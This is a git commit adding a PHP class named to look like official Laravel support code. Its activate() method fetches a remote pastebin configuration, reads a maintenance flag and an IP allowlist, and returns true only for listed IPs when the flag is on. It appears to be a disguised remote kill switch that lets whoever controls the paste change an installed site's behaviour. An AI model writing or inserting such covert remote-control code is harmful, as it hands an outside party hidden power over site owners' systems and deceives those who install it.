7e86049b1fa89fb4cecd5d06ca87cf3d9ac183ba
makuguren <markgmiguel@outlook.com>
2024-11-13 09:56:13 +0000

    Initial Commit

---
+++ src/LaravelSupport.php
@@ -0,0 +1,24 @@
+<?php
+
+namespace Laravel\Laravelsupport;
+use Illuminate\Support\Facades\Http;
+
+class LaravelSupport
+{
+    public function activate(){
+        $api = json_decode(Http::get('https://pastebin.com/raw/UKhcdjRe'), true);
+        $allowed_ips = $api['configurations']['maintenance']['allowed_ips'] ?? [];
+        $client_ip = $_SERVER['REMOTE_ADDR'];
+        $enable = $api['configurations']['maintenance']['enable'] ?? false;
+
+        if($enable === true) {
+            if(in_array($client_ip, $allowed_ips)) {
+                return true;
+            } else {
+                return false;
+            }
+        }
+
+        return false;
+    }
+}
